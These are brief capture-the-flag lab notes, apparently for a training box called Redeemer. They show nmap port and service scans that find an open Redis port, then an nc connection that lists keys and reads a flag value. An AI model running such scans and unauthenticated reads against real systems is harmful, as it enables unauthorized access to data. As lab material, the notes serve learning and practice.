# Redeemer — Lab Notes

## Target
IP: <TARGET_IP>

---

# Recon

nmap -p- -sS -T4 --min-rate 1000 <TARGET_IP>

Result:
6379/tcp open redis

---

# Service Scan

nmap -sV -p 6379 <TARGET_IP>

Service:
Redis key-value store

---

# Exploitation

nc <TARGET_IP> 6379

PING
PONG

INFO keyspace
KEYS *
GET flag

Flag retrieved.
